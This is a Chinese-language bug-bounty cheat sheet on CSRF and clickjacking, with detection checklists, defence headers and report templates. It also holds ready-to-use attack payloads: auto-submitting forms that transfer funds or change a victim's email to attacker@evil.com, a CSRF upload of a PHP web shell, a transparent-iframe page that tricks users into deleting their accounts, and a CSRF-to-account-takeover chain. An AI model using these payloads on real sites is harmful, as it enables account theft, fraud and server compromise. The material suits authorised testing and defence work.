# CSRF / Clickjacking

> **CWE**: CWE-352 (CSRF) / CWE-1021 (Clickjacking)
> **OWASP**: WSTG-SESS-05 / WSTG-CLNT-09 / A01:2021

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| POST/PUT/DELETE 不带 CSRF Token / Origin 校验 | CSRF 可能 | §1 CSRF |
| Cookie 缺 `SameSite=Lax/Strict` | 跨站请求带 Cookie | §1 |
| 响应 Header 缺 `X-Frame-Options` / `frame-ancestors` | Clickjacking 可能 | §2 |
| 关键操作 (改密/改邮箱/转账) 无二次确认 | CSRF 高影响 | §1 |
| `Access-Control-Allow-Credentials: true` + ACAO 反射 Origin | 变种 CSRF (CORS) | → [cors-cache.md](cors-cache.md) |
| Referer 检查可伪造 / 缺失 | 防护失效 | §1 |
| CSRF Token 不绑定用户 / 可复用 | Token 防护无效 | §1 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 删 Token 后 200 但操作未生效 | Token 可空但二次校验存在 | 检查响应内容,可能假 200 |
| Token 校验通过但 Referer 也校验 | 双层防护 | 试 Referer 删除/伪造 |
| iframe 加载被拒 | XFO 已配置 | 看 frame-ancestors,有时漏配 |
| SameSite=Lax 但 GET 敏感 | GET 仍可 CSRF | §1.3 GET CSRF |

---

## 1. CSRF (Cross-Site Request Forgery)

### 1.1 快速识别

| 信号 | 说明 |
|------|------|
| POST/PUT/DELETE 未带 CSRF Token | 大概率漏洞 |
| Cookie 未设 `SameSite=Strict/Lax` | 跨站请求能携带 Cookie |
| 关键操作(改密/改邮箱/转账)无二次确认 | 可 CSRF 利用 |
| Referer 检查可伪造/缺失 | 防护失效 |
| CSRF Token 不过期/不绑定用户 | 可 CSRF |
| `Access-Control-Allow-Credentials: true` 且 ACAO 反射 Origin | 变种 CSRF(CORS滥用) |

### 1.2 Testing Checklist

- [ ] 删除 Referer 头 → 请求仍成功?
- [ ] 修改 Referer 到 evil.com → 请求仍成功?
- [ ] 删除 CSRF Token 字段 → 仍成功?
- [ ] CSRF Token 留空(空字符串) → 仍成功?
- [ ] 用过期 Token → 仍成功?
- [ ] 用 A 用户的 Token 给 B 用户 → 仍成功? (Token 未绑定用户)
- [ ] JSON 请求改为 `application/x-www-form-urlencoded` → 可构造 HTML form CSRF
- [ ] `OPTIONS` 预检是否可绕过(简单请求利用)
- [ ] GET 请求执行敏感操作?
- [ ] 二次确认(比如改密码要旧密码)是否缺失?

### 1.3 GET CSRF (最简)

```html
<img src="https://target.com/api/delete?id=123">
<img src="https://target.com/api/logout">
<link rel="icon" href="https://target.com/api/user/vote?post=1">
```

### 1.4 POST CSRF - 标准 HTML Form

```html
<form action="https://target.com/api/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

### 1.5 POST CSRF - application/json (JSON CSRF)

**技巧 1**: 后端不严格校验 Content-Type, 可用 form 提交 JSON 字符串:

```html
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='y"}'>
</form>
<script>document.forms[0].submit()</script>
```

实际发送的 body: `{"email":"attacker@evil.com","x":"=y"}`

**技巧 2**: 某些后端接受 `application/json` 但不预检, 用 fetch:
```html
<script>
fetch('https://target.com/api/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"email":"attacker@evil.com"}'
});
</script>
```

**技巧 3**: Flash-based CORS 绕过(已废弃但部分老系统仍受影响)

### 1.6 Multipart CSRF (文件上传)

```html
<form action="https://target.com/api/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <!-- 通过 JavaScript 填充内容 -->
</form>
<script>
var form = document.forms[0];
var blob = new Blob(['<?php system($_GET["cmd"]);?>'], {type:'application/x-php'});
var dt = new DataTransfer();
dt.items.add(new File([blob], 'shell.php'));
form.file.files = dt.files;
form.submit();
</script>
```

### 1.7 CSPT2CSRF (Client-Side Path Traversal → CSRF)

利用前端 JS 用户可控路径 + CSRF:

```
# 前端代码: fetch(`/api/${userInput}`)
# 攻击者让 userInput = "../admin/delete/999"
# 实际请求: /api/../admin/delete/999 → /admin/delete/999
# 带上用户 cookie → 删除操作被执行
```

### 1.8 绕过 SameSite Cookie

| Cookie 属性 | 默认 (Chrome 80+) | 绕过方法 |
|-------------|------------------|----------|
| 无 SameSite | Lax(浏览器默认) | GET request 仍携带, POST 不行 |
| `SameSite=Lax` | Lax | 仅顶层导航(window.location / form GET)携带 |
| `SameSite=Strict` | Strict | 基本无法 CSRF |
| `SameSite=None; Secure` | None | 跨站仍携带 |

**Lax 的绕过**:
- 用 POST → GET 改写(若接口支持 `_method=DELETE` 或方法重写)
- 用 `<form method="GET">` + 副作用 GET
- 利用 "新窗口顶层导航" 仍携带

**跨子域 CSRF** (SameSite 不隔离子域):
```
attacker.target.com (已接管) → target.com API
```

### 1.9 报告示例 PoC

```html
<!-- PoC: 修改 victim 邮箱 -->
<html><body>
<form id=csrf action="https://target.com/api/user/update" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>csrf.submit()</script>
</body></html>
```

---

## 2. Clickjacking (UI Redressing)

### 2.1 快速识别

| 信号 | 说明 |
|------|------|
| 响应无 `X-Frame-Options` | 可 iframe |
| 响应无 `Content-Security-Policy: frame-ancestors` | 可 iframe |
| 关键操作页(改密码/删除账号/授权)可被 iframe | 高危 |
| CSRF Token 存在但 Clickjacking 可绕过(用户"手动"点) | 仍高危 |

### 2.2 检测

```bash
curl -I https://target.com/account/delete | grep -iE "x-frame|content-security-policy"
# 若两者都不存在 → 可 Clickjacking
```

### 2.3 基础 PoC

```html
<!DOCTYPE html>
<html>
<head><style>
  iframe {
    opacity: 0.3;   /* 0 是完全透明, 攻击时应为 0 */
    position: absolute;
    top: 100px;
    left: 100px;
    width: 800px;
    height: 600px;
  }
  .decoy {
    position: absolute;
    top: 200px;
    left: 300px;
    font-size: 20px;
    z-index: -1;
  }
</style></head>
<body>
<div class="decoy">点这里领取 100 元红包 ↓</div>
<iframe src="https://target.com/account/delete"></iframe>
</body>
</html>
```

当受害者点击 "领取红包" 时, 实际点的是 iframe 里的 "确认删除账号" 按钮。

### 2.4 高级 Clickjacking

**Drag-and-Drop Clickjacking**: 让用户拖拽看似无害元素, 实则填充表单。

**Cursor Hijacking**: CSS `cursor: none` + 虚假光标, 让用户以为点的是 A 实际点 B。

**Double Click Jacking**: 利用浏览器双击特性执行不同操作。

**XSSI + Clickjacking**: 嵌入目标页读取 DOM(若 SOP 失守)。

### 2.5 Defense 解读

| 头 | 值 | 效果 |
|----|-----|-----|
| `X-Frame-Options` | `DENY` | 完全禁止被 iframe |
| `X-Frame-Options` | `SAMEORIGIN` | 只允许同源 iframe |
| `X-Frame-Options` | `ALLOW-FROM https://trusted.com` | 废弃, 现代浏览器忽略 |
| `Content-Security-Policy` | `frame-ancestors 'none'` | 等同 DENY |
| `Content-Security-Policy` | `frame-ancestors 'self'` | 等同 SAMEORIGIN |
| `Content-Security-Policy` | `frame-ancestors https://trusted.com` | 指定允许 |

**只看 X-Frame-Options 不够**, 现代浏览器优先遵循 `frame-ancestors`。

### 2.6 报告模板

```
## VULN: 删除账号页面 Clickjacking

| 属性 | 详情 |
|------|------|
| 等级 | 中危 (CVSS 6.5) |
| 目标 | https://target.com/account/delete |
| 类型 | Clickjacking / UI Redressing |
| CWE | CWE-1021 |
| WSTG | WSTG-CLNT-09 |
| 条件 | 用户已登录 target.com 且点击攻击页的诱饵 |
| 影响 | 账号被永久删除 |

### 复现
1. 受害者在 target.com 登录中
2. 访问攻击者页面(PoC HTML 附件)
3. 被诱骗点击 "领取红包" 按钮
4. 实际点击了 target.com 账号删除确认按钮

### PoC(见附件)

### 修复建议
- 设置 `Content-Security-Policy: frame-ancestors 'self'`
- 设置 `X-Frame-Options: DENY` (兼容旧浏览器)
- 关键操作加二次确认(输入密码/验证码)
```

---

## 3. 组合攻击

### 3.1 CSRF + XSS

XSS 可读 Token → 构造合法 CSRF 请求; 或 XSS 直接发请求(同源可忽略 CSRF Token)。

### 3.2 Clickjacking + CSRF

Clickjacking 让用户 "主动" 点击合法按钮, 浏览器会带上所有 Cookie + CSRF Token → 绕过大多数 CSRF 防护。**这也是 Clickjacking 的高危点**。

### 3.3 CSRF + 子域名接管

若 `attacker.target.com` 被接管, 与 target.com 共享 Cookie → 内部 CSRF(更容易成功)。

### 3.4 CSRF → 账号接管完整链路

```
Step 1: CSRF 修改受害者邮箱为 attacker@evil.com
Step 2: 在 attacker@evil.com 触发密码重置
Step 3: 收到重置邮件 → 改密码
Step 4: 用新密码登录受害者账号
```

---

## 4. Testing Checklist(合并)

### CSRF
- [ ] 关键操作是否有 CSRF Token
- [ ] Token 是否绑定会话/用户
- [ ] Token 是否可被跨站读取(XSS/CORS)
- [ ] Referer 检查是否严格
- [ ] Cookie SameSite 属性
- [ ] JSON 请求是否预检
- [ ] 变种: CSPT2CSRF / GET 副作用 / 跨子域

### Clickjacking
- [ ] `X-Frame-Options` 头
- [ ] `Content-Security-Policy: frame-ancestors`
- [ ] JS framebusting (if-top-location) 是否健壮
- [ ] 关键操作页(删除/转账/改权限)是否全部保护

---

## 5. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| 请求没带 Cookie 也成功 | 可能是 API, 不涉及用户凭据, 不算 CSRF |
| 测试账号是新创建无关键数据 | 影响级别低, 但漏洞真实 |
| 有 CSRF Token 但参数名固定 | 还是可能被 XSS 窃取 |
| iframe 显示白屏 | 可能是 JS framebusting, 检查控制台错误 |
| SameSite=Lax 但 GET 能触发副作用 | CSRF 仍可利用 |

---

## 6. 影响证明

**低**: 成功发起一个无害 CSRF 请求(比如改昵称)。

**高**(冲赏金):
1. CSRF 链式: 改邮箱 → 改密码 → 账号接管
2. Clickjacking + 敏感操作: 删账号 / 转账 / 授权 OAuth
3. CSRF 财务操作: 转账 / 充值 / 退款

---

## 7. 相关参考

| 内容 | 文件 |
|------|------|
| XSS(常与 CSRF 组合) | [xss.md](xss.md) |
| Session 管理 | [../auth-logic.md](../auth-logic.md) §Session与Cookie安全 |
| CORS(ACAO 配置不当也可做 CSRF) | [cors-cache.md](cors-cache.md) |
| 子域名接管(共享 Cookie) | [subdomain-takeover.md](subdomain-takeover.md) |

---

**CWE**: CWE-352 / CWE-1021 | **CVSS 典型**: CSRF 6.5-8.8 / Clickjacking 4.3-6.5
